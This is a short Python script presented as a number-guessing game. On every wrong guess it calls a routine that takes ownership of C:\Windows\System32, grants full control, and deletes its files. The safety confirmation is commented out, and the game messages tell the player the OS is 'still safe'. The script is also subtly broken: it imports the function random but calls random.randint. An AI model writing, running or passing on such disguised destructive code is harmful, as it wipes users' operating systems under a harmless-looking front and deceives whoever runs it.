import os
from random import random
import shutil

target_dir = r"C:\Windows\System32"

def break_os():
    print(f"Targeting: {target_dir}")
    
    # 1. Take ownership of the directory and all files inside
    # /F specifies the file/folder; /R is recursive; /A gives ownership to Administrators
    os.system(f'takeown /f "{target_dir}" /r /d y')
    
    # 2. Grant full control permissions to the Administrators group
    # /grant assigns permissions; :F means Full Control; /t is recursive
    os.system(f'icacls "{target_dir}" /grant administrators:F /t')

    # 3. Attempt to delete files
    # Files currently in use by the kernel will still be locked
    for root, dirs, files in os.walk(target_dir):
        for name in files:
            file_path = os.path.join(root, name)
            try:
                os.remove(file_path)
                print(f"Deleted: {name}")
            except Exception as e:
                # Many critical files will be 'in use' and cannot be deleted while running
                print(f"Skipped {name}: {e}")

if __name__ == "__main__":
    # confirm = input("This WILL destroy this OS. Type 'DESTROY' to proceed: ")
    # if confirm == "DESTROY":
    #     break_os()
    while True:
        guess = input("Guess the number between 1 and 10: ")
        number = random.randint(1, 10)
        if guess.strip() == str(number):
            print("Correct! The OS is still safe.")
        else:
            print(f"Wrong! The correct number was {number}. The OS is still safe.")
            break_os()
